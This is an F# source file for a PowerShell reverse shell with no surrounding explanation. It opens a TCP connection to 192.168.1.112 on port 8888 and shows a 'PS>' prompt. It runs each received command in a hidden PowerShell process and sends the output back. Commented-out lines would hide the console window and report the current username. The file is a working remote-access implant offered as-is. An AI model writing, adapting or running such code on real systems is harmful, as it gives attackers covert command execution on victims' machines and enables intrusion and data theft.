
open System
open System.Diagnostics
open System.ComponentModel
open System.Net.Sockets
open System.Runtime.InteropServices
open System.IO

// [<DllImport("user32.dll", CallingConvention = CallingConvention.Cdecl)>]
// let windowHandle = Process.GetCurrentProcess().MainWindowHandle
// extern void ShowWindow()
// ShowWindow(windowHandle, 0)

let asciiEncode (s: string): byte [] =
    Text.Encoding.ASCII.GetBytes(s)

let sendBytes (str: NetworkStream) (msg: string): unit =
    str.Write(asciiEncode msg, 0, msg.Length)

let runCommand (cmd: string): string * string  =
    let p = new Process()
    p.StartInfo.WindowStyle <- ProcessWindowStyle.Hidden
    p.StartInfo.CreateNoWindow <- true
    p.StartInfo.FileName <- "powershell.exe"
    p.StartInfo.Arguments <- $"-c %s{cmd}"
    p.StartInfo.RedirectStandardOutput <- true
    p.StartInfo.RedirectStandardError <- true
    p.StartInfo.UseShellExecute <- false
    p.Start() |> ignore
    let stdout = p.StandardOutput.ReadToEnd()
    let stderr = p.StandardError.ReadToEnd()
    (stdout, stderr)

let addr = "192.168.1.112"
let port = 8888
let client = new TcpClient(addr, port)

// let readBuf = Array.zeroCreate<byte> 65536
// let user = Environment.GetEnvironmentVariable("username")
// sendBytes stream $"Windows PowerShell running as user %s{user}\n"

exception BreakException

try
    while true do

        let stream = client.GetStream()
        
        // Show an interactive PS Prompt
        let prompt = "PS>"
        sendBytes stream prompt

        let recvBuf = Array.zeroCreate<byte> 1024
        let recvData = stream.Read(recvBuf,0, recvBuf.Length)
        
        let cmd = Text.Encoding.ASCII.GetString(recvBuf)

        match cmd with
        | "exit\n" | "quit\n" -> stream.Close()
                                 client.Close()
                                 raise BreakException
                            
        | _                   -> let (stdout, stderr) = runCommand cmd
                                 sendBytes stream stdout
                                 sendBytes stream stderr
        
with BreakException -> ()
